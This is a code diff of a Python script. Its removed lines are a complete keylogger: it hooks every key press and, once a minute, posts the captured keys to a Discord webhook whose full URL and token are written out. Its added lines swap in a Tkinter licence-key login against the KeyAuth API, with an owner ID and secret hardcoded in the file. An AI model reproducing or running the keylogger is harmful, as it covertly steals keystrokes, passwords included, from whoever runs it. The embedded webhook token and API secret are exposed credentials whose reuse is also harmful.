@@ -1,53 +1,56 @@
-#======//import\\======
-import keyboard
+# main.py
+
 import requests
-import time
-import threading
-#======\\import//======
+import sys
+import tkinter as tk
+from tkinter import simpledialog, messagebox
 
-#======//全域變數\\======
-WEBHOOK_URL = "https://discord.com/api/webhooks/1415534715032567828/zgGU_mMASlaMTqhlMo_IC3xBVFvoHMI8C6XWucMnBpGaS_2E59a9kKw3zZpatXXma4Gi"
-key_events = []  # 用來儲存一分鐘內的所有按鍵事件
-last_send_time = time.time()  # 記錄上次發送的時間
-#======\\全域變數//======
+# Replace these with your KeyAuth application credentials
+KEYAUTH_APP_NAME = "Galaxeegt's Application"
+KEYAUTH_OWNER_ID = "nOSHxhiVmn"
+KEYAUTH_SECRET = "563399d1519cee4e9cc18cb57807d9c1f95451e34ba6b1a8e40967e89d550990"
+KEYAUTH_VERSION = "1.0"
 
-#======//webhook\\------
-def send_webhook(keys):
-    payload = {"content": f"這一分鐘內按下了: {', '.join(keys)}"}  # 發送按鍵事件列表
+KEYAUTH_API_URL = "https://keyauth.win/api/1.2/"
+
+def keyauth_login(key):
+    payload = {
+        "type": "login",
+        "key": key,
+        "name": KEYAUTH_APP_NAME,
+        "ownerid": KEYAUTH_OWNER_ID,
+        "ver": KEYAUTH_VERSION
+    }
     try:
-        response = requests.post(WEBHOOK_URL, json=payload)
-        response.raise_for_status()
-        print(f"Webhook 已發送: {keys}")
-    except Exception as e:
-        print("Webhook 發送失敗：", e)
-#------\\webhook//------
+        response = requests.post(KEYAUTH_API_URL, data=payload)
+        data = response.json()
+        return data.get("success", False)
+    except Exception:
+        return False
 
-#======//檢查時間並發送按鍵事件\\======
-def check_and_send():
-    global last_send_time, key_events
-    while True:
-        time.sleep(60)  # 每 60 秒檢查一次
-        current_time = time.time()
-        if current_time - last_send_time >= 60:  # 超過 60 秒
-            if key_events:
-                send_webhook(key_events)  # 發送所有儲存的按鍵事件
-                key_events = []  # 清空已發送的事件
-            last_send_time = current_time  # 更新發送時間
-#======\\檢查時間並發送按鍵事件//======
-  
-#======//key_event\\------
-def key_press(event):
-    global key_events
-    print(event.name)
-    key_events.append(event.name)  # 儲存按鍵事件
+def prompt_for_key():
+    root = tk.Tk()
+    root.withdraw()
+    key = simpledialog.askstring("KeyAuth Login", "Enter your KeyAuth key:")
+    root.destroy()
+    return key
 
-#------\\key_event//------
+def main_screen():
+    root = tk.Tk()
+    root.title("Main Screen")
+    label = tk.Label(root, text="Welcome to the main screen!", font=("Arial", 16))
+    label.pack(padx=20, pady=20)
+    root.mainloop()
 
-# 開啟一個線程來每分鐘發送一次按鍵事件
-thread = threading.Thread(target=check_and_send)
-thread.daemon = False  # 設置為守護線程，程序結束時會自動關閉
-thread.start()
+def main():
+    key = prompt_for_key()
+    if not key:
+        sys.exit()
+    if keyauth_login(key):
+        main_screen()
+    else:
+        messagebox.showerror("Error", "Invalid KeyAuth key.")
+        sys.exit()
 
-keyboard.on_press(key_press)
-print("LRU EPTL")
-keyboard.wait()
+if __name__ == "__main__":
+    main()
